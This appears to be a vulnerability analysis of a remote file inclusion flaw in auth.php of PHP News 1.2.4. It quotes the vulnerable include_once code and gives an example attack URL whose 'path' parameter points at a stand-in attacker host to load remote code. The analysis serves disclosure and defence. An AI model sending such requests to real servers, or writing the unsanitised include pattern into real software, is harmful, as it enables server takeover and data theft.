Based on the provided content, here's an analysis of the vulnerability:

**Vulnerability Details:**

*   **Root Cause:** The `auth.php` script in PHP News versions 1.2.4 and possibly 1.2.3, contains a flaw that allows for remote file inclusion. The script uses a variable named `$path` which is taken directly from user input via the GET parameter `path` without sanitization. This allows an attacker to manipulate the path used in an `include_once` statement.

*   **Weaknesses/Vulnerabilities Present**:
    *   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include files from a remote location. Specifically, the vulnerable code is:
    ```php
      else if(file_exists($path . 'languages/' . $lang . '.admin.lng')) {
        include_once($path . 'languages/' . $lang . '.admin.lng');
        ....
      }
    ```
    The `$path` variable is directly derived from user input and allows an attacker to specify a remote URL, leading to remote file inclusion.

*   **Impact of Exploitation:**
    *   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the victim's server. This can lead to a full compromise of the server, allowing the attacker to steal data, modify the website, or use the server for further attacks.

*   **Attack Vectors:**
    *   **HTTP GET Request:** The vulnerability is exploited through a crafted HTTP GET request to the `auth.php` script. The attacker appends a `path` parameter with a malicious URL, e.g. `http://[victim]/[dir]/auth.php?path=http://[hacker_box]/`
    * The attack requires `register_globals` and `allow_url_fopen` to be enabled

*   **Required Attacker Capabilities/Position:**
    *   **Network Access:** The attacker needs to have network access to the vulnerable server.
    *   **Basic HTTP Knowledge:** The attacker needs to understand how to craft HTTP GET requests.
    *   **Web server with malicious file**: The attacker needs to host a malicious file on a server accessible via HTTP.

**Additional Information:**

*   The vulnerability was discovered by Filip Groszynski (VXSfx).
*   A proof-of-concept exploit was released by mozako.
*   The vulnerability exists in PHP News versions 1.2.4 and possibly 1.2.3.
*   The vendor has been notified and a patch is expected.
